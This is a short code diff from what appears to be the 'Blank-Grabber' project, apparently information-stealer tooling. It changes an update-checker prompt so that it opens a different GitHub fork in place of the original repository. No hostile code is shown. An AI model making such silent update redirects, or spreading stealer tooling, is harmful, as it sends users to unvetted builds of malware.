@@ -885,7 +885,7 @@ if __name__ == "__main__":
 		if Utility.CheckForUpdates():
 			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)")
 			if response:
-				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
+				webbrowser.open_new_tab("https://github.com/haiAzure/Blank-Grabber")
 				exit(0)
 	
 		# Do not hide console so it can show if there is any error
